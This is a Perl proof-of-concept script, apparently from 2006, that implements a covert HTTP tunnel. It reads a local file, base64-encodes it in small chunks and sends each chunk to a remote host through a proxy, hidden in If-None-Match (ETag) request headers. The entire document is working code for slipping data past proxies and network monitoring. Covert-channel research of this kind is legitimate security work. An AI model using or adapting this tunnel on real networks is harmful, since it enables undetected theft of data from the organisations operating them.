#!/usr/bin/perl -w
# Wondjina is a PoC of HTTP tunneling using the ETag header
# 2006 Maarten Van Horenbeeck [maarten@daemon.be]

use IO::Socket;
use MIME::Base64;

$daemon = '000.000.000.000';
$host = '10.0.0.1';
$port = 3128;
$datasource = './wondjina.in';
$header = 20;
$file = 'wondjina.txt';

print "Wondjina client [Web Header Tunneling]\n";
print "Transmitting $datasource to $daemon through $host port $port\n\n";

open DATA, "$datasource";
binmode DATA;

while ( 
 read (DATA, $buffer, $header)
) { my $newbuffer= encode_base64($buffer, '');

my $sock = new IO::Socket::INET(
                   PeerAddr => $host,
                   PeerPort => $port,
                   Proto    => 'tcp');
 $sock or die "no socket :$!";

print $sock "GET http://$daemon/$file HTTP/1.1\n";
print $sock "Host: $daemon\n";
print $sock "If-None-Match: \"$newbuffer\"\n";
print $sock "Byte-range: 0-500\n\n";
print "Processing $newbuffer\n";
my $request =<$sock>;
my $requestb =<$sock>;
my $requestc =<$sock>;

};

print "\n[~] Transfer completed.\n";
close DATA;
